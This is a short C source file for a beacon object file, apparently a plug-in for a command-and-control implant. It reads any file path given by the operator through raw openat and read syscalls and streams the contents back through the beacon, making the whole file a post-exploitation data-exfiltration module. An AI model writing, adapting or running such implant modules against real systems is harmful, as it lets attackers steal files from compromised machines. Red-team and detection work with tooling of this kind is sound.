/*
 * bof/cat/bof.c
 *
 * Read a file from disk and stream it back through the beacon.
 *
 * args/alen: a NUL-terminated path string. The beacon's args
 * parser is what usually hands us this.
 *
 * Build:
 *   make bof-cat
 */
#include "beacon_api.h"
#include "syscalls.h"

void go(char *args, int alen) {
    if (alen <= 0 || !args || args[0] == '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "[cat] missing path argument\n");
        return;
    }

    /* The beacon guarantees a NUL-terminated args buffer. */
    char *filepath = args;

    long fd = syscall3(SYS_openat, AT_FDCWD, (long)filepath, 0);
    if (fd < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[cat] cannot open %s\n", filepath);
        return;
    }

    char buffer[4096];
    long total = 0;
    long n;
    while ((n = syscall3(SYS_read, fd, (long)buffer, (long)sizeof(buffer))) > 0) {
        BeaconOutput(CALLBACK_OUTPUT, buffer, (int)n);
        total += n;
    }
    syscall1(SYS_close, fd);

    BeaconPrintf(CALLBACK_OUTPUT, "[cat] %ld bytes from %s\n", total, filepath);
}
